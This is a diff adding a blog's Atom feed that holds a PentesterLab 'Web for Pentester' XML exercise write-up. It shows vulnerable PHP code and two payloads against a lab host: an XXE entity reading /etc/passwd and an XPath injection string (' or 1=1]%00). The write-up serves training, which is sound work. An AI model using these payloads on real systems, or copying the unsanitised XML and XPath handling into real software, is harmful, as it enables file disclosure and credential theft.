@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: xml | Bob1Bob2]]></title>
+  <link href="http://wg135.github.io/blog/categories/xml/atom.xml" rel="self"/>
+  <link href="http://wg135.github.io/"/>
+  <updated>2016-04-27T15:40:42-05:00</updated>
+  <id>http://wg135.github.io/</id>
+  <author>
+    <name><![CDATA[Bob1Bob2]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Pentesterlab--Web for Pentester-XML]]></title>
+    <link href="http://wg135.github.io/blog/2016/03/23/pentesterlab-web-for-pentester-xml/"/>
+    <updated>2016-03-23T16:11:36-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/03/23/pentesterlab-web-for-pentester-xml</id>
+    <content type="html"><![CDATA[<p>Web for Pentester: This exercise is a set of the most common web vulnerabilities</p>
+
+<p>Difficluty: 1/5</p>
+
+<!--more-->
+
+
+<p>OWASP: <a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_%28OTG-INPVAL-008%29">Testing for XML Injection</a></p>
+
+<h3>Example 1</h3>
+
+<p>code review</p>
+
+<pre><code class="php example1.php">&lt;?php
+  $xml=simplexml_load_string($_GET['xml']);
+  print_r((string)$xml);
+?&gt;
+</code></pre>
+
+<p>XML injection point search:</p>
+
+<p>ZAP add fuzzing file:</p>
+
+<p><code>https://wfuzz.googlecode.com/svn/trunk/wordlist/Injections/XML.txt</code></p>
+
+<p>exploit:</p>
+
+<p><code>http://192.168.79.162/xml/example1.php?xml=&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file:////etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code></p>
+
+<p><code>!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file:////etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</code> needed to be encoded.</p>
+
+<h3>Example 2</h3>
+
+<p>code review</p>
+
+<pre><code class="php example2.php"> $x = "&lt;data&gt;&lt;users&gt;&lt;user&gt;&lt;name&gt;hacker&lt;/name&gt;&lt;message&gt;Hello hacker&lt;/message&gt;&lt;password&gt;pentesterlab&lt;/password&gt;&lt;/user&gt;&lt;user&gt;&lt;name&gt;admin&lt;/name&gt;&lt;message&gt;Hello admin&lt;/message&gt;&lt;password&gt;s3cr3tP4ssw0rd&lt;/password&gt;&lt;/user&gt;&lt;/users&gt;&lt;/data&gt;";
+
+  $xml=simplexml_load_string($x);
+  $xpath = "users/user/name[.='".$_GET['name']."']/parent::*/message";
+  $res = ($xml-&gt;xpath($xpath));
+  while(list( ,$node) = each($res)) {
+      echo $node;
+  }
+</code></pre>
+
+<p>exploit:</p>
+
+<p><code>http://192.168.79.162/xml/example2.php?name=' or 1=1]%00</code></p>
+]]></content>
+  </entry>
+  
+</feed>
